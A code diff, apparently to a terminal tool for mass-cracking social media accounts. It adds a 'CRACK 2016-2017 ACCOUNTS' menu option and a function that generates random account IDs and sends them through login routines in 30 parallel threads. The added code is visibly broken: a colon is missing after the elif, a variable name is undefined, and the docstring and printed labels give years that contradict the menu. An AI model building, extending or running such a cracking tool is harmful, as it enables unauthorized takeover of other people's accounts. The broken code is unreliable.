@@ -320,6 +320,7 @@ def old_clone():
     print("\033[1;32m║ [1] CRACK ALL ACCOUNTS          ║\033[0m")
     print("\033[1;32m║ [2] 100004 / 100004             ║\033[0m")
     print("\033[1;32m║ [3] CRACK 2009-2010 ACCOUNTS    ║\033[0m")
+    print("\033[1;32m║ [4] CRACK 2016-2017 ACCOUNTS    ║\033[0m")
     print("\033[1;32m║ [0] BACK TO MAIN MENU           ║\033[0m")
     print("\033[1;32m╚══════════════════════════════════╝\033[0m")
     _input = choice = input(f"\x1b[38;5;196m➤\x1b[1;37m CHOICE {W}:{Y} \x1b[38;5;46m➤➤\x1b[0m ")
@@ -329,6 +330,8 @@ def old_clone():
         old_Tow()
     elif _input in ('3', 'c', '03', '3'):
         old_Tree()
+    elif _input in ('4', 'd', '04', '4')
+        old_Four()
     else:
         print(f"\n[×]{rad} Choose Value Option... ")
         BNG_71_()
@@ -541,6 +544,48 @@ def old_Tree():
                 print(f"    {rad}[!] INVD METHOD SELECTED")
                 break
 
+def old_Four():
+    """
+    Cloning method for accounts from 2009-2010.
+    """
+    user = []
+    ____banner____()
+    print(f"\x1b[38;5;196m➤ \x1b[1;37mOLD CODE\x1b[0m \x1b[38;5;46m{Y}:{G}\x1b[0m \x1b[38;5;244m2009-20110\x1b[0m")
+    ask = input(f"\x1b[38;5;196m➤\x1b[1;37m SELECT \x1b[0m\x1b[38;5;46m{Y}:{G}\x1b[0m ")
+    linex()
+    ____banner____()
+    print(f"\x1b[38;5;196m╭─[\x1b[1;37m★\x1b[38;5;196m]─➤\x1b[38;5;46m EXAMPLE {Y}:{G} \x1b[38;5;226m20000 \x1b[1;37m•\x1b[38;5;226m 30000 \x1b[1;37m•\x1b[38;5;226m 99999\x1b[0m")
+    print(f"\x1b[38;5;196m╰───────────────────────────────\x1b[0m")
+    limit = input(f"\x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID COUNT {Y}:{G} ")
+    linex()
+    prefixs = ['10001', '10002']
+    for _ in range(int(limit)):
+        suffix = ''.join(random.choices('0123456789', k=10))
+        uid = prefix + suffix
+        user.append(uid)
+    print("\x1b[38;5;82m┌── [ 1 ] ─────────────────────┐\x1b[0m")
+    print("\x1b[38;5;82m│ METHOD 1                     │\x1b[0m")
+    print("\x1b[38;5;82m└──────────────────────────────┘\x1b[0m")
+
+    print("\x1b[38;5;196m┌── [ 2 ] ─────────────────────┐\x1b[0m")
+    print("\x1b[38;5;196m│ METHOD 2                     │\x1b[0m")
+    print("\x1b[38;5;196m└──────────────────────────────┘\x1b[0m")
+    linex()
+    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE {W}(1/2): {Y}").strip().upper()
+    with tred(max_workers=30) as pool:
+        ____banner____()
+        print(f"\x1b[1;96m[★]➤ TOTAL IDS CRACK : \x1b[1;32m{limit:<10}\x1b[0m")
+        print(f"\x1b[1;96m[★]➤ SELECTED        : \x1b[1;32mM1\x1b[0m")
+        print(f"\x1b[1;96m[★]➤ FLIGHT MODE     : \x1b[1;32mON\x1b[0m / \x1b[1;31mOFF\x1b[0m")
+        linex()
+        for uid in user:
+            if meth == '1':
+                pool.submit(login_1, uid)
+            elif meth == '2':
+                pool.submit(login_2, uid)
+            else:
+                print(f"    {rad}[!] INVD METHOD SELECTED")
+                break
 
 def login_1(uid):
     """
